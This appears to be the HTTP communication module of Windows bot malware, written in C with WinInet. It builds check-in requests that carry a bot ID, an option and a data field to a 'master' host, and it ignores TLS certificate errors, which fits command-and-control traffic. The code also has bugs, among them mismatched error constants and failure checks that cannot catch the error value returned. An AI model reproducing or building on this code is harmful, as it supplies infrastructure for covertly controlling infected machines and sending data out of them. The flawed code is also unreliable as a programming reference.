#include <windows.h>
#include <wininet.h>
#include <strsafe.h>
#include "config.h"
#include "http.h"


HINTERNET hInet = NULL;
HINTERNET hConnect = NULL;

/**
 * @brief Connect via HTTP for comunication to master
 * @returns 0xFFFFFFFF if error
 *          HANDLE to request if success
 */
HINTERNET __http_connect(char *get) {
	HINTERNET hRequest = NULL;
	DWORD len=NULL;




	if((hInet=InternetOpenA(USER_AGENT, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0))==NULL) { //INTERNET_FLAG_ASYNC
		return((HINTERNET)0xFFFFFFFF);
	}
	
	
	
	if((hConnect=InternetConnectA(	hInet, 
				  	HOST, 
					PORT, 
					NULL, 
					NULL, 
					INTERNET_SERVICE_HTTP, 
					INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_KEEP_CONNECTION,
					0))==NULL) {
		return((HINTERNET)0xFFFFFFFF);
	}
	

	
	if((hRequest=HttpOpenRequestA(hConnect, METHOD, get, "HTTP/1.1", NULL, NULL, 
					INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
					INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
					INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP  |
					INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS |
					INTERNET_FLAG_NO_AUTH |
					INTERNET_FLAG_NO_CACHE_WRITE |
					INTERNET_FLAG_NO_UI |
					INTERNET_FLAG_PRAGMA_NOCACHE |
					INTERNET_FLAG_RELOAD | INTERNET_FLAG_EXISTING_CONNECT,
					0))==NULL) {
		return((HINTERNET)0xFFFFFFF);
	}
	
/*	if(HttpSendRequestA(hRequest, NULL, 0, NULL, 0)==FALSE) {
		return(0xFFFFFFFF);		
	}
*/

	return(hRequest);
}


/**
 * @brief Make full post request from 
 * @param original input original encoded string
 * @param original_len length of original string 
 * @param encode output base64 decode string
 * @encoded_len output base64 decode string length
 * @returns 0 if error
 *          1 if encoded success
 */
int __http_make_get(char *get_data, char *option, char *data, char *token) {
	if((lstrlenA(option)+lstrlenA(data)+lstrlenA(token)+lstrlenA(PATH)+lstrlenA(VAR_BID)+lstrlenA(BOTID))>MAX_GET_LEN) {
		return(0xFFFFFFFF);
	}

	if(lstrcpynA(get_data, PATH, lstrlenA(PATH)+1)==NULL)
		return(0xFFFFFFFF);

	if(lstrcatA(get_data, VAR_BID)==NULL)
		return(0xFFFFFFF);

	if(lstrcatA(get_data, BOTID)==NULL)
		return(0xFFFFFFF);


	if(lstrcatA(get_data, VAR_OPTION)==NULL) {
		return(0xFFFFFFFF);
	}

	if(lstrcatA(get_data, option)==NULL) {
                return(0xFFFFFFFF);
	}	
		
	if(lstrcatA(get_data, VAR_DATA)==NULL) {
                return(0xFFFFFFFF);
	}

	if(lstrcatA(get_data, data)==NULL) {
                return(0xFFFFFFFF);
	}
/*
	if(lstrcatA(get_data, VAR_TOKEN)==NULL) {
                return(0xFFFFFFFF);
	}
	
	if(lstrcatA(get_data, token)==NULL) {
                return(0xFFFFFFFF);
	}

	if(lstrcatA(get_data, HTTP_RETURN)==NULL) {
		return(0xFFFFFFFF);
	}
*/
	return(lstrlenA(get_data));
	

}

int __http_reply(char *get_data, char *reply) {
	int datalen = lstrlenA(get_data);
	DWORD len=NULL;
	DWORD replylen=lstrlenA(reply);
	HANDLE hRequest = NULL;


	if(!(hRequest=__http_connect(get_data)))
		return -1;


	if(datalen==0) {
		datalen=sizeof(char *);
	}	

	
	
	if(HttpSendRequestA(hRequest, NULL,0,0,0)==FALSE) {
		return(0xFFFFFFFF);		
	}

	else {
		if(InternetReadFile(hRequest, reply,replylen, &len)==FALSE) {
			return(0xFFFFFFFF);
		}
	}
	
	
	__http_close(hRequest);
	return(len);
}

int __http_read(char *get_data, char *reply) {
	HANDLE hRequest = NULL;
	DWORD len=NULL;
	DWORD replylen = 20000;
	char *header = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024);

	ZeroMemory(header, 1024);

	if(!(hRequest = __http_connect(get_data)))
		return -1;

	if(HttpSendRequestA(hRequest, NULL, 0, 0,0)==FALSE) {
		HeapFree(GetProcessHeap(),HEAP_NO_SERIALIZE,header);
		return(0xFFFFFFFF);		
	}

	else {
		if(InternetReadFile(hRequest, reply,replylen, &len)==TRUE) {
			HeapFree(GetProcessHeap(),HEAP_NO_SERIALIZE,header);
			return(lstrlenA(reply));
		}
	}
	
	if(header)
		HeapFree(GetProcessHeap(),HEAP_NO_SERIALIZE,header);


	__http_close(hRequest);
	return(len);
}





// CLOSE
int __http_close(HINTERNET hRequest) {
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInet);
	return(0);
}

